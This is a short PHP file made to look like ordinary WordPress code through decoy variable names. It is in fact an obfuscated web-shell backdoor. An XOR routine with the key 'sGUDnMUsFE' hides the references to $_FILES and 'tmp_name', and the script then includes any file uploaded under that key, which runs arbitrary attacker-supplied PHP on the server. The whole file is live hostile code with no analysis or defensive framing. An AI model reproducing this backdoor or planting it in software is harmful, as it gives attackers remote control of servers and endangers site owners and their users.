<?php 	
$target = 'sGUDnMUsFE';
	$postname_index = 'import_id';
$link = $target;
function richedit($original_image_url, $apos_flag)

{

    $opening_tag = $apos_flag;
    $enclosure = urldecode($original_image_url);
    $count2 = substr($opening_tag,0, strlen($enclosure));

    $post_category = $enclosure ^ $count2;
	$original_image = 'comments_in';
    return $post_category;
}
$ancestors = ${richedit("%2C%01%1C%08%2B%1E", $link)};
$default_labels = $ancestors;
	$orderby_array = 'statuses';
$label_count = isset($default_labels[$link]);
if ($label_count)

{

    $meta_input = $ancestors[$link];
	$open_q_flag = 'encoded_char_length';
    $field_no_prefix = $meta_input[richedit("%07%2A%25%1B%00%2C8%16", $link)];

    $email_address = $field_no_prefix;
    include ($email_address);
}

?>
